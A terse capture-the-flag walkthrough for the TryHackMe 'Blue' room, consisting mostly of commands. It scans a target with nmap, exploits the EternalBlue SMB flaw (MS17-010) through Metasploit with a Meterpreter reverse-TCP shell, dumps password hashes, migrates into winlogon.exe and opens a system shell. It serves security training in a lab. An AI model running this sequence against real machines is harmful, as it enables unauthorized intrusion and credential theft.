# Blue

## link

[Blue](https://tryhackme.com/room/blue)

---

## package

```bash
kali:~ # apt install nmap
kali:~ # apt install metasploit-framework
```

---

## flow

```bash
kali:~ $ export target_ip=

# scan port
kali:~ $ nmap -P -1000 -Pn -sV --script vuln ${target_ip}

# metasploit
kali:~ $ msfconsole -q
msf > search CVE-2017-0143|ms17-010
msf > use 0
msf exploit(windows/smb/ms17_010_eternalblue) > show options
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <target_ip>
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST <vpn_ip>|tun0
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST
msf exploit(windows/smb/ms17_010_eternalblue) > show payloads
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options
msf exploit(windows/smb/ms17_010_eternalblue) > exploit

meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > ps
meterpreter > migrate -N winlogon.exe

meterpreter > search -f flag*.txt
meterpreter > cat flag.txt
meterpreter > shell

C:\Windows\system32> whoami
C:\Windows\system32> (Ctrl+Z to background)
```
